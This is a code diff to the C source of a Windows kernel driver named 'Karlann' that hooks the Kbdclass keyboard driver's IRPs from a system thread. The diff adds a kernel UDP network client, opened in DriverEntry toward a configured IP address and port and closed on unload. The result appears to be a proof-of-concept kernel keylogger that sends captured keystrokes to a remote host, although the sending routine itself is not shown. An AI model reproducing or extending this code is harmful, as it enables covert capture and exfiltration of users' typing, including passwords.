@@ -1,5 +1,6 @@
 
 #include "global.h"
+#include "libwsk.h"
 #include "kbd.h"
 
 PDEVICE_OBJECT gPocDeviceObject = NULL;
@@ -634,7 +635,7 @@ PocIrpHookInitThread(
             KbdObj->InitSuccess = TRUE;
 
             PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
-                ("%s->ExInterlockedInsertTailList gPocDeviceObject = %p KbdObj = %p KbdDeviceObject = %p.\nBttmDeviceObject = %p KbdFileObject = %p.\n\n",
+                ("\n%s->ExInterlockedInsertTailList gPocDeviceObject = %p KbdObj = %p KbdDeviceObject = %p.\nBttmDeviceObject = %p KbdFileObject = %p.\n",
                     __FUNCTION__,
                     gPocDeviceObject,
                     KbdObj,
@@ -704,156 +705,6 @@ EXIT:
     }
 
     PsTerminateSystemThread(Status);
-}
-
-
-NTSTATUS
-DriverEntry(
-    _In_ PDRIVER_OBJECT  DriverObject,
-    _In_ PUNICODE_STRING RegistryPath
-)
-/*++
-
-Routine Description:
-    DriverEntry initializes the driver and is the first routine called by the
-    system after the driver is loaded. DriverEntry specifies the other entry
-    points in the function driver, such as EvtDevice and DriverUnload.
-
-Parameters Description:
-
-    DriverObject - represents the instance of the function driver that is loaded
-    into memory. DriverEntry must initialize members of DriverObject before it
-    returns to the caller. DriverObject is allocated by the system before the
-    driver is loaded, and it is released by the system after the system unloads
-    the function driver from memory.
-
-    RegistryPath - represents the driver specific path in the Registry.
-    The function driver can use the path to store driver related data between
-    reboots. The path does not store hardware instance specific data.
-
-Return Value:
-
-    STATUS_SUCCESS if successful,
-    STATUS_UNSUCCESSFUL otherwise.
-
---*/
-{
-    UNREFERENCED_PARAMETER(DriverObject);
-    UNREFERENCED_PARAMETER(RegistryPath);
-
-    NTSTATUS Status = 0;
-
-    UNICODE_STRING DriverName = { 0 };
-    PDRIVER_OBJECT KbdDriverObject = NULL;
-
-    HANDLE ThreadHandle = NULL;
-    
-
-    RtlInitUnicodeString(&DriverName, L"\\Karlann");
-
-    Status = IoCreateDevice(
-        DriverObject,
-        sizeof(DEVICE_EXTENSION),
-        &DriverName,
-        FILE_DEVICE_KEYBOARD,
-        0,
-        FALSE,
-        &gPocDeviceObject);
-
-    if (!NT_SUCCESS(Status))
-    {
-        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
-            ("%s->IoCreateDevice failed. Status = 0x%x.\n",
-                __FUNCTION__, Status));
-        goto EXIT;
-    }
-
-    /*
-    * 使用内存Irp->AssociatedIrp.SystemBuffer
-    */
-    gPocDeviceObject->Flags |= DO_BUFFERED_IO;
-
-
-    /*
-    * 找到键盘驱动Kbdclass的DeviceObject
-    */
-    RtlInitUnicodeString(&DriverName, L"\\Driver\\Kbdclass");
-
-    Status = ObReferenceObjectByName(
-        &DriverName,
-        OBJ_CASE_INSENSITIVE, 
-        NULL, 
-        FILE_ALL_ACCESS, 
-        *IoDriverObjectType,
-        KernelMode, 
-        NULL, 
-        &KbdDriverObject);
-
-    if (!NT_SUCCESS(Status))
-    {
-        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
-            ("%s->ObReferenceObjectByName %ws failed. Status = 0x%x.\n", 
-                __FUNCTION__, 
-                DriverName.Buffer,
-                Status));
-        goto EXIT;
-    }
-
-
-    ((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdDriverObject = KbdDriverObject;
-
-    InitializeListHead(&((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdObjListHead);
-    KeInitializeSpinLock(&((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdObjSpinLock);
-
-
-    DriverObject->MajorFunction[IRP_MJ_READ] = PocReadOperation;
-    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = PocDeviceControlOperation;
-
-    DriverObject->DriverUnload = PocUnload;
-
-
-    Status = PsCreateSystemThread(
-        &ThreadHandle,
-        THREAD_ALL_ACCESS,
-        NULL,
-        NULL,
-        NULL,
-        PocIrpHookInitThread,
-        NULL);
-
-    if (!NT_SUCCESS(Status))
-    {
-        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
-            ("%s->PsCreateSystemThread PocIrpHookInitThread failed. Status = 0x%x.\n",
-                __FUNCTION__,
-                Status));
-        goto EXIT;
-    }
-
-    if (NULL != ThreadHandle)
-    {
-        ZwClose(ThreadHandle);
-        ThreadHandle = NULL;
-    }
-
-    
-    Status = STATUS_SUCCESS;
-
-EXIT:
-
-    if (!NT_SUCCESS(Status) && NULL != gPocDeviceObject)
-    {
-        IoDeleteDevice(gPocDeviceObject);
-        gPocDeviceObject = NULL;
-    }
-
-    if (!NT_SUCCESS(Status) && NULL != KbdDriverObject)
-    {
-        ObDereferenceObject(KbdDriverObject);
-        KbdDriverObject = NULL;
-    }
-
-    return Status;
 }
 
 
@@ -929,7 +780,7 @@ PocKbdObjListCleanup(
 
 
             PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
-                ("%s->Safe to unload. gPocDeviceObject = %p KbdObj = %p KbdDeviceObject = %p.\nBttmDeviceObject = %p KbdFileObject = %p KbdFileObject->DeviceObject = %p.\n\n",
+                ("\n%s->Safe to unload. gPocDeviceObject = %p KbdObj = %p KbdDeviceObject = %p.\nBttmDeviceObject = %p KbdFileObject = %p KbdFileObject->DeviceObject = %p.\n",
                     __FUNCTION__,
                     gPocDeviceObject,
                     KbdObj,
@@ -974,6 +825,9 @@ PocUnload(
 
     PocKbdObjListCleanup();
 
+    CloseWSKClient();
+    WSKCleanup();
+
     if (NULL != ((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdDriverObject)
     {
         ObDereferenceObject(((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdDriverObject);
@@ -985,4 +839,192 @@ PocUnload(
         IoDeleteDevice(gPocDeviceObject);
         gPocDeviceObject = NULL;
     }
+}
+
+
+NTSTATUS
+DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath
+)
+/*++
+
+Routine Description:
+    DriverEntry initializes the driver and is the first routine called by the
+    system after the driver is loaded. DriverEntry specifies the other entry
+    points in the function driver, such as EvtDevice and DriverUnload.
+
+Parameters Description:
+
+    DriverObject - represents the instance of the function driver that is loaded
+    into memory. DriverEntry must initialize members of DriverObject before it
+    returns to the caller. DriverObject is allocated by the system before the
+    driver is loaded, and it is released by the system after the system unloads
+    the function driver from memory.
+
+    RegistryPath - represents the driver specific path in the Registry.
+    The function driver can use the path to store driver related data between
+    reboots. The path does not store hardware instance specific data.
+
+Return Value:
+
+    STATUS_SUCCESS if successful,
+    STATUS_UNSUCCESSFUL otherwise.
+
+--*/
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    NTSTATUS Status = 0;
+
+    UNICODE_STRING DriverName = { 0 };
+    PDRIVER_OBJECT KbdDriverObject = NULL;
+
+    WSKDATA WSKData = { 0 };
+
+    HANDLE ThreadHandle = NULL;
+
+    RtlInitUnicodeString(&DriverName, L"\\Karlann");
+
+    Status = IoCreateDevice(
+        DriverObject,
+        sizeof(DEVICE_EXTENSION),
+        &DriverName,
+        FILE_DEVICE_KEYBOARD,
+        0,
+        FALSE,
+        &gPocDeviceObject);
+
+    if (!NT_SUCCESS(Status))
+    {
+        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
+            ("%s->IoCreateDevice failed. Status = 0x%x.\n",
+                __FUNCTION__, Status));
+        goto EXIT;
+    }
+
+    /*
+    * 使用内存Irp->AssociatedIrp.SystemBuffer
+    */
+    gPocDeviceObject->Flags |= DO_BUFFERED_IO;
+
+
+    /*
+    * 找到键盘驱动Kbdclass的DeviceObject
+    */
+    RtlInitUnicodeString(&DriverName, L"\\Driver\\Kbdclass");
+
+    Status = ObReferenceObjectByName(
+        &DriverName,
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        FILE_ALL_ACCESS,
+        *IoDriverObjectType,
+        KernelMode,
+        NULL,
+        &KbdDriverObject);
+
+    if (!NT_SUCCESS(Status))
+    {
+        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
+            ("%s->ObReferenceObjectByName %ws failed. Status = 0x%x.\n",
+                __FUNCTION__,
+                DriverName.Buffer,
+                Status));
+        goto EXIT;
+    }
+
+
+    ((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdDriverObject = KbdDriverObject;
+
+    InitializeListHead(&((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdObjListHead);
+    KeInitializeSpinLock(&((PDEVICE_EXTENSION)(gPocDeviceObject->DeviceExtension))->gKbdObjSpinLock);
+
+
+    DriverObject->MajorFunction[IRP_MJ_READ] = PocReadOperation;
+    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = PocDeviceControlOperation;
+
+    DriverObject->DriverUnload = PocUnload;
+
+
+    /*
+    * UDP初始化
+    */
+    Status = WSKStartup(MAKE_WSK_VERSION(1, 0), &WSKData);
+
+    if (!NT_SUCCESS(Status))
+    {
+        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
+            ("%s->WSKStartup failed. Status = 0x%x.\n",
+                __FUNCTION__, Status));
+        goto EXIT;
+    }
+
+    Status = StartWSKClientUDP(
+        POC_IP_ADDRESS,
+        POC_UDP_PORT,
+        AF_INET, 
+        SOCK_DGRAM);
+
+    if (!NT_SUCCESS(Status))
+    {
+        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
+            ("%s->StartWSKClientUDP failed. Status = 0x%x.\n",
+                __FUNCTION__, Status));
+        goto EXIT;
+    }
+
+
+    /*
+    * 创建键盘Hook初始化线程
+    */
+    Status = PsCreateSystemThread(
+        &ThreadHandle,
+        THREAD_ALL_ACCESS,
+        NULL,
+        NULL,
+        NULL,
+        PocIrpHookInitThread,
+        NULL);
+
+    if (!NT_SUCCESS(Status))
+    {
+        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
+            ("%s->PsCreateSystemThread PocIrpHookInitThread failed. Status = 0x%x.\n",
+                __FUNCTION__,
+                Status));
+        goto EXIT;
+    }
+
+    if (NULL != ThreadHandle)
+    {
+        ZwClose(ThreadHandle);
+        ThreadHandle = NULL;
+    }
+
+
+    Status = STATUS_SUCCESS;
+
+EXIT:
+
+    if (!NT_SUCCESS(Status) && NULL != gPocDeviceObject)
+    {
+        IoDeleteDevice(gPocDeviceObject);
+        gPocDeviceObject = NULL;
+    }
+
+    if (!NT_SUCCESS(Status) && NULL != KbdDriverObject)
+    {
+        ObDereferenceObject(KbdDriverObject);
+        KbdDriverObject = NULL;
+    }
+
+    if (!NT_SUCCESS(Status))
+    {
+        CloseWSKClient();
+        WSKCleanup();
+    }
+
+    return Status;
 }
